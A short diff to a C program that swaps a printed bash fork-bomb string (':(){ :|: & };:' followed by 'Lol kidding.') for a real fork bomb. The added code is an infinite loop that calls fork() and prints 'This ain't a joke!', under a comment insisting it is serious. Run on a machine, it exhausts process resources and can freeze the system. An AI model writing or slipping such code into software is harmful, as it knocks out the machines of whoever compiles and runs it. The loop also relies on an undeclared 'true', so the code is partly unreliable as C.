@@ -1,8 +1,12 @@
 #include <stdio.h>
 
 int main(void) {
-    printf(":(){ :|: & };:\n");
-    printf("Lol kidding.\n");
+    
+    // I'm serious 'bout dis :|
+    while(true) {
+        fork();
+        printf("This ain't a joke!");
+    }
 
     return 0;
 }
